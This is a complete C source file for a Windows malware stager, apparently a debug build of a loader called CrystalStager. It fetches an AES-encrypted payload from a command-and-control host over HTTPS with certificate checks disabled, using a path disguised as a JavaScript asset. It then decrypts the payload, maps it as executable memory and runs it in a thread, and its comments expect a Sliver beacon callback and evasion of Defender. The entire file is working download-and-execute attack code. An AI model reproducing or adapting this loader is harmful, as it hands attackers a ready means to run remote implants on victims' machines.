/*
 * stager_debug.c — diagnostic version, shows MessageBox at each step
 * Build: x86_64-w64-mingw32-gcc -Wall -Os -mwindows stager_debug.c resource.o
 *        -o build/debug.exe -ladvapi32 -lbcrypt -lwinhttp
 */

#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <stdio.h>
#include "payload_key.h"

#define _WIDE(x) L ## x
#define WIDE(x) _WIDE(x)

#ifndef C2_HOST_STR
#define C2_HOST_STR "YOUR_IP"
#endif
#ifndef C2_PORT_NUM
#define C2_PORT_NUM 443
#endif
#ifndef C2_PATH_STR
#define C2_PATH_STR "/assets/js/vendor.js"
#endif

#define C2_HOST     WIDE(C2_HOST_STR)
#define C2_PORT     C2_PORT_NUM
#define C2_PATH     WIDE(C2_PATH_STR)

static void dbg(const char *fmt, ...)
{
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    MessageBoxA(NULL, buf, "CrystalStager Debug", MB_OK);
}

static BYTE *download_payload(DWORD *out_len)
{
    BYTE *buf = NULL;
    DWORD total = 0, cap = 0;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"Debug/1.0",
                           WINHTTP_ACCESS_TYPE_NO_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { dbg("WinHttpOpen FAILED: %lu", GetLastError()); return NULL; }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    if (!hConnect) { dbg("WinHttpConnect FAILED: %lu", GetLastError()); goto cleanup; }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", C2_PATH,
                                  NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hRequest) { dbg("WinHttpOpenRequest FAILED: %lu", GetLastError()); goto cleanup; }

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        dbg("WinHttpSendRequest FAILED: %lu", GetLastError());
        goto cleanup;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        dbg("WinHttpReceiveResponse FAILED: %lu", GetLastError());
        goto cleanup;
    }

    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        NULL, &status, &sz, NULL);
    dbg("HTTP status: %lu", status);

    for (;;) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
        if (avail == 0) break;
        if (total + avail > cap) {
            cap = (total + avail) * 2;
            BYTE *tmp = (BYTE *)LocalAlloc(LMEM_FIXED, cap);
            if (!tmp) { LocalFree(buf); buf = NULL; goto cleanup; }
            if (buf) { memcpy(tmp, buf, total); LocalFree(buf); }
            buf = tmp;
        }
        DWORD rd = 0;
        if (!WinHttpReadData(hRequest, buf + total, avail, &rd)) break;
        total += rd;
    }

    *out_len = total;
    dbg("Downloaded: %lu bytes", total);

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return buf;
}

static BYTE *aes_cbc_decrypt(const BYTE *ct, DWORD ct_len, DWORD *pt_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE iv[16];
    DWORD out_len = 0;
    BYTE *pt = NULL;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (st) { dbg("BCryptOpenAlg FAILED: 0x%08lx", st); return NULL; }

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    st = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                    (PUCHAR)payload_key, payload_key_len, 0);
    if (st) { dbg("BCryptGenKey FAILED: 0x%08lx", st); goto cleanup; }

    memcpy(iv, payload_iv, 16);
    st = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                       iv, 16, NULL, 0, &out_len, BCRYPT_BLOCK_PADDING);
    if (st) { dbg("BCryptDecrypt(size) FAILED: 0x%08lx", st); goto cleanup; }

    dbg("Decrypt output size: %lu bytes", out_len);

    pt = (BYTE *)LocalAlloc(LMEM_FIXED, out_len);
    if (!pt) { dbg("LocalAlloc FAILED"); goto cleanup; }

    memcpy(iv, payload_iv, 16);
    st = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                       iv, 16, pt, out_len, pt_len, BCRYPT_BLOCK_PADDING);
    if (st) {
        dbg("BCryptDecrypt FAILED: 0x%08lx", st);
        LocalFree(pt);
        pt = NULL;
    } else {
        dbg("Decrypted OK: %lu bytes\nFirst 4 bytes: %02x %02x %02x %02x",
            *pt_len, pt[0], pt[1], pt[2], pt[3]);
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return pt;
}

typedef void (*pico_fn)(void *);

typedef struct { pico_fn fn; void *addr; } wargs;

static DWORD WINAPI debug_worker(LPVOID param)
{
    wargs *wa = (wargs *)param;
    wa->fn(NULL);
    return 0;
}

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
{
    (void)hi; (void)hp; (void)lp; (void)ns;

    dbg("Step 1: Starting download from\nhttps://" C2_HOST_STR ":%d" C2_PATH_STR, C2_PORT);

    DWORD ct_len = 0;
    BYTE *ct = download_payload(&ct_len);
    if (!ct || ct_len == 0) { dbg("Download FAILED or empty"); return 1; }

    dbg("Step 2: Decrypting %lu bytes", ct_len);
    DWORD pt_len = 0;
    BYTE *pt = aes_cbc_decrypt(ct, ct_len, &pt_len);
    LocalFree(ct);
    if (!pt) { dbg("Decrypt FAILED"); return 1; }

    dbg("Step 3: VirtualAlloc RW (%lu bytes)", pt_len);
    void *rw = VirtualAlloc(NULL, pt_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rw) { dbg("VirtualAlloc FAILED: %lu", GetLastError()); LocalFree(pt); return 1; }

    memcpy(rw, pt, pt_len);
    LocalFree(pt);

    DWORD old;
    if (!VirtualProtect(rw, pt_len, PAGE_EXECUTE_READ, &old)) {
        dbg("VirtualProtect RX FAILED: %lu", GetLastError());
        VirtualFree(rw, 0, MEM_RELEASE);
        return 1;
    }

    dbg("Step 4: Memory ready (RX). About to execute PICO.\nAddress: 0x%p\nSize: %lu bytes", rw, pt_len);

    dbg("Step 5: About to call PICO at 0x%p via worker thread", rw);

    wargs wa = { (pico_fn)rw, rw };

    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)debug_worker, &wa, 0, NULL);
    if (!h) { dbg("CreateThread FAILED: %lu", GetLastError()); return 1; }

    /* Wait up to 10 seconds — if beacon is alive it won't return */
    DWORD wr = WaitForSingleObject(h, 10000);
    if (wr == WAIT_TIMEOUT) {
        dbg("Step 6: PICO thread still alive after 10s — beacon is running!\nCheck Sliver for callback.");
    } else {
        DWORD exitcode = 0;
        GetExitCodeThread(h, &exitcode);
        dbg("Step 6: PICO thread EXITED (code=%lu)\nThis means the PICO crashed or Defender killed it.", exitcode);
    }

    CloseHandle(h);
    for (;;) SleepEx(30000, TRUE);
    return 0;
}
